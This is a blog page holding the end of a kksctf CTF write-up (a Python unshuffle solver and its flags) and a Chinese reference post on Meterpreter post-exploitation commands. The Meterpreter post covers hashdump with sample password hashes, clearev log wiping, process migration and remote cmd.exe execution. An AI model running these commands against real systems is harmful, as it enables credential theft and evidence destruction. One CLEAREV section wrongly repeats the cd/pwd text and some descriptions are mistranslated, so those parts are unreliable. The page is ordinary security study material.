<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h4><p>Find the directory <code>/postbox</code> in robots.txt, then change the method from GET to POST, then you can get the flag.</p>
<p><img src="/2019/12/30/kksctf-writeup/flag1.png" alt="flag"></p>
<ul>
<li>flag: kks{thanks_f0r_m@1l}</li>
</ul>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Every-day-I’m-shuffling"><a href="#Every-day-I’m-shuffling" class="headerlink" title="Every day I’m shuffling"></a>Every day I’m shuffling</h4><p>I didn’t solved this chall because I used python2 to reverse it, then I can’t find the seed. You should use python3 and linux to reverse it, because some byte code way’s diffenert. The last <code>solve.py</code> is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># For kksctf-shufflout.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Shuffle</span>(<span class="params">p, data</span>):</span></span><br><span class="line">    buf = <span class="built_in">list</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        buf[i] = data[p[i]]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_index</span>(<span class="params">p</span>):</span></span><br><span class="line">    ans = [<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        ans[p[i]] = i</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    file_name = <span class="string">&quot;message_from_above&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">19</span>):</span><br><span class="line">        seed(i)</span><br><span class="line">        file_name_list = <span class="built_in">list</span>(file_name)</span><br><span class="line">        shuffle(file_name_list)</span><br><span class="line">        shuffle_name = <span class="string">&#x27;&#x27;</span>.join(file_name_list)</span><br><span class="line">        <span class="keyword">if</span> shuffle_name == <span class="string">&quot;fsegovs_meaoerbma_&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;seed:&quot;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># The above show the seed is 3</span></span><br><span class="line">    data = <span class="built_in">open</span>(<span class="string">&#x27;fsegovs_meaoerbma_.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(data))) <span class="comment"># get the same permuation</span></span><br><span class="line">    shuffle(p)</span><br><span class="line">    p = reverse_index(p)</span><br><span class="line">    data = Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,data))))))))))))))))))))))))))))))))))))))))</span><br><span class="line">    out = <span class="built_in">open</span>(<span class="string">&#x27;origin.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    out.write(<span class="string">&#x27;&#x27;</span>.join(data))</span><br><span class="line">    out.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">$ python3.7 shufllout.py</span><br><span class="line">seed: 3</span><br><span class="line">$ cat origin.txt</span><br><span class="line">Once upon a midnight dreary, <span class="keyword">while</span> I pondered, weak and weary,</span><br><span class="line">Over many a quaint and curious volume of forgotten lore—</span><br><span class="line">    While I nodded, nearly napping, suddenly there came a tapping,</span><br><span class="line">As of some one gently rapping, rapping at my chamber door.</span><br><span class="line">“’Tis some visitor,” I muttered, “tapping at my chamber door—</span><br><span class="line">            Only this and nothing more.”</span><br><span class="line"></span><br><span class="line">    Ah, distinctly I remember it was <span class="keyword">in</span> the bleak December;</span><br><span class="line">And each separate dying ember wrought its ghost upon the floor.</span><br><span class="line">    Eagerly I wished the morrow;—vainly I had sought to borrow</span><br><span class="line">    From my books surcease of sorrow—sorrow <span class="keyword">for</span> the lost Lenore—</span><br><span class="line">For the rare and radiant maiden whom the angels name Lenore—</span><br><span class="line">            Nameless here <span class="keyword">for</span> evermore.</span><br><span class="line"></span><br><span class="line">    And the silken, sad, uncertain rustling of each purple curtain</span><br><span class="line">Thrilled me—filled me with fantastic terrors never felt before;</span><br><span class="line">    So that now, to still the beating of my heart, I stood repeating</span><br><span class="line">    “’Tis some visitor entreating entrance at my chamber door—</span><br><span class="line">Some late visitor entreating entrance at my chamber door;—</span><br><span class="line">            This it is and nothing more.”</span><br><span class="line"></span><br><span class="line">    Presently my soul grew stronger; hesitating <span class="keyword">then</span> no longer,</span><br><span class="line">“Sir,” said I, “or Madam, truly your forgiveness I implore;</span><br><span class="line">    But the fact is I was napping, and so gently you came rapping,</span><br><span class="line">    And so faintly you came tapping, tapping at my chamber door,</span><br><span class="line">That I scarce was sure I heard you”—here I opened wide the door;—</span><br><span class="line">            Darkness there and nothing more.</span><br><span class="line"></span><br><span class="line">    Deep into that darkness peering, long I stood there wondering, fearing,</span><br><span class="line">Doubting, dreaming dreams no mortal ever dared to dream before;</span><br><span class="line">    But the silence was unbroken, and the stillness gave no token,</span><br><span class="line">    And the only word there spoken was the whispered word, “Lenore?”</span><br><span class="line">This I whispered, and an <span class="built_in">echo</span> murmured back the word, “Lenore!”—</span><br><span class="line">            Merely this and nothing more.</span><br><span class="line"></span><br><span class="line">    Back into the chamber turning, all my soul within me burning,</span><br><span class="line">Soon again I heard a tapping somewhat louder than before.</span><br><span class="line">    “Surely,” said I, “surely that is something at my window lattice;</span><br><span class="line">      Let me see, <span class="keyword">then</span>, what thereat is, and this mystery explore—</span><br><span class="line">Let my heart be still a moment and this mystery explore;—</span><br><span class="line">            ’Tis the wind and nothing more!”</span><br><span class="line"></span><br><span class="line">    Open here I flung the shutter, when, with many a flirt and flutter,</span><br><span class="line">In there stepped a stately Raven of the saintly days of yore;</span><br><span class="line">    Not the least obeisance made he; not a minute stopped or stayed he;</span><br><span class="line">    But, with mien of lord or lady, perched above my chamber door—</span><br><span class="line">Perched upon a bust of Pallas just above my chamber door—</span><br><span class="line">            Perched, and sat, and nothing more.</span><br><span class="line"></span><br><span class="line">Then this ebony bird beguiling my sad fancy into smiling,</span><br><span class="line">By the grave and stern decorum of the countenance it wore,</span><br><span class="line">“Though thy crest be shorn and shaven, thou,” I said, “art sure no craven,</span><br><span class="line">Ghastly grim and ancient Raven wandering from the Nightly shore—</span><br><span class="line">Tell me what thy lordly name is on the Night’s Plutonian shore!”</span><br><span class="line">            Quoth the Raven “kks&#123;5huffl3_5huffl3_5huffl3&#125;”</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>flag: kks{5huffl3_5huffl3_5huffl3}</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">meterpreter常用命令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-12-29 18:22:56" itemprop="dateCreated datePublished" datetime="2019-12-29T18:22:56+08:00">2019-12-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-12-30 01:10:46" itemprop="dateModified" datetime="2019-12-30T01:10:46+08:00">2019-12-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="METERPRETER命令用法"><a href="#METERPRETER命令用法" class="headerlink" title="METERPRETER命令用法"></a>METERPRETER命令用法</h2><p>所有的命令都会涉及到，若没有，实践是检验的唯一标准。</p>
<h2 id="HELP"><a href="#HELP" class="headerlink" title="HELP"></a>HELP</h2><p>展示帮助菜单：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    background    Backgrounds the current session</span><br><span class="line">    channel       Displays information about active channels</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure>

<h2 id="BACKGROUND"><a href="#BACKGROUND" class="headerlink" title="BACKGROUND"></a>BACKGROUND</h2><p>把当前session放到后台，然后返回‘msf’提示的命令行，如果要返回session，使用sessions命令选择：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="CAT"><a href="#CAT" class="headerlink" title="CAT"></a>CAT</h2><p>查看文件内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat</span><br><span class="line">Usage: cat file</span><br><span class="line"></span><br><span class="line">Example usage:</span><br><span class="line">meterpreter &gt; cat edit.txt</span><br><span class="line">What you talkin<span class="string">&#x27; about Willis</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="CD-AND-PWD"><a href="#CD-AND-PWD" class="headerlink" title="CD AND PWD"></a>CD AND PWD</h2><p>切换目录，查看当前目录：</p>
<p>参数:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>:	Path of the folder to change to</span><br><span class="line"><span class="built_in">pwd</span>:	None required</span><br></pre></td></tr></table></figure>

<p>示例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; pwd</span><br><span class="line">c:\</span><br><span class="line">meterpreter &gt; cd c:\windows</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">c:\windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="CLEAREV"><a href="#CLEAREV" class="headerlink" title="CLEAREV"></a>CLEAREV</h2><p>清除Windows上的日志，（Clear Event），Windows上的日志可以使用事件查看器（Event Viewer）来查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>:	Path of the folder to change to</span><br><span class="line"><span class="built_in">pwd</span>:	None required</span><br></pre></td></tr></table></figure>

<p>Example usuage:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">c:\</span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> c:\windows</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">c:\windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="CLEAREV-1"><a href="#CLEAREV-1" class="headerlink" title="CLEAREV"></a>CLEAREV</h2><p>The <strong>clearev</strong> command will clear the <em>Application</em>, <em>System</em>, and <em>Security</em> logs on a <em>Windows</em> system. There are no options or arguments.</p>
<p><a target="_blank" rel="noopener" href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_before.png"><img src="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_before.png" alt="Before using Meterpreter to clear the logs | Metasploit Unleashed"></a></p>
<p>上面是没有使用<strong>clearev</strong>命令清除前。</p>
<p>用法:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 97 records from Application...</span><br><span class="line">[*] Wiping 415 records from System...</span><br><span class="line">[*] Wiping 0 records from Security...</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_after.png"><img src="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_after.png" alt="After using Meterpreter to clear the logs | Metasploit Unleashed"></a></p>
<p>上图是清除后的Windows系统日志。</p>
<h2 id="DOWNLOAD"><a href="#DOWNLOAD" class="headerlink" title="DOWNLOAD"></a>DOWNLOAD</h2><p>从目标机上下载文件，注意路径需要使用两个反斜杠：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download c:\\boot.ini</span><br><span class="line">[*] downloading: c:\boot.ini -&gt; c:\boot.ini</span><br><span class="line">[*] downloaded : c:\boot.ini -&gt; c:\boot.ini/boot.ini</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="EDIT"><a href="#EDIT" class="headerlink" title="EDIT"></a>EDIT</h2><p>使用<strong>vim</strong> 编辑文件：</p>
<p>示例:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\Administrator\Desktop</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">.</span><br><span class="line">...snip...</span><br><span class="line">.</span><br><span class="line">100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; edit edit.txt</span><br></pre></td></tr></table></figure>

<p>查看更高级的用法.<a target="_blank" rel="noopener" href="http://www.vim.org/">http://www.vim.org/</a></p>
<h2 id="EXECUTE"><a href="#EXECUTE" class="headerlink" title="EXECUTE"></a>EXECUTE</h2><p>在目标机器上执行命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -f cmd.exe -i -H</span><br><span class="line">Process 38320 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>

<h2 id="GETUID"><a href="#GETUID" class="headerlink" title="GETUID"></a>GETUID</h2><p>返回目标主机的服务器名字：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="HASHDUMP"><a href="#HASHDUMP" class="headerlink" title="HASHDUMP"></a>HASHDUMP</h2><p>dump出Windows上SAM数据库的内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump </span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line">Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::</span><br><span class="line">dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::</span><br><span class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::</span><br><span class="line">victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="IDLETIME"><a href="#IDLETIME" class="headerlink" title="IDLETIME"></a>IDLETIME</h2><p>返回远程主机用户在线的时长：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle <span class="keyword">for</span>: 5 hours 26 mins 35 secs</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="IPCONFIG"><a href="#IPCONFIG" class="headerlink" title="IPCONFIG"></a>IPCONFIG</h2><p>查看远程主机的网络配置情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">MS TCP Loopback interface</span><br><span class="line">Hardware MAC: 00:00:00:00:00:00</span><br><span class="line">IP Address  : 127.0.0.1</span><br><span class="line">Netmask     : 255.0.0.0</span><br><span class="line"></span><br><span class="line">AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport</span><br><span class="line">Hardware MAC: 00:0c:29:10:f5:15</span><br><span class="line">IP Address  : 192.168.1.104</span><br><span class="line">Netmask     : 255.255.0.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="LPWD-AND-LCD"><a href="#LPWD-AND-LCD" class="headerlink" title="LPWD AND LCD"></a>LPWD AND LCD</h2><p>查看本地的当前目录和改变本地的目录，即攻击者的目录：</p>
<p>参数:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lpwd:		None required</span><br><span class="line">lcd:		Destination folder</span><br></pre></td></tr></table></figure>

<p>示例:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/root</span><br><span class="line"></span><br><span class="line">meterpreter &gt; lcd MSFU</span><br><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/root/MSFU</span><br><span class="line"></span><br><span class="line">meterpreter &gt; lcd /var/www</span><br><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="LS"><a href="#LS" class="headerlink" title="LS"></a>LS</h2><p>列出远程主机当前目录下的文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\victim</span><br><span class="line">=========================================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified                   Name</span><br><span class="line">----              ----     ----  -------------                   ----</span><br><span class="line">40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .</span><br><span class="line">40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..</span><br><span class="line">100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel</span><br><span class="line">40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure>

<h2 id="MIGRATE"><a href="#MIGRATE" class="headerlink" title="MIGRATE"></a>MIGRATE</h2><p>注入到另外一个进程中去：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/migrate </span><br><span class="line"></span><br><span class="line">[*] Running module against V-MAC-XP</span><br><span class="line">[*] Current server process: svchost.exe (1076)</span><br><span class="line">[*] Migrating to explorer.exe...</span><br><span class="line">[*] Migrating into process ID 816</span><br><span class="line">[*] New server process: Explorer.EXE (816)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><p>列出目标当前正在运行的进程：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process list</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">    PID   Name                  Path</span><br><span class="line">    ---   ----                  ----</span><br><span class="line">    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe</span><br><span class="line">    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe</span><br><span class="line">    288   snmp.exe              C:\WINDOWS\System32\snmp.exe</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure>

<h2 id="RESOURCE"><a href="#RESOURCE" class="headerlink" title="RESOURCE"></a>RESOURCE</h2><p><strong>resource</strong> 命令会一行一行地执行文本文件里的meterpreter命令，默认情况下，命令是在目标机的当前目录下执行，而resource文件则是在攻击机本地工作目录下。</p>
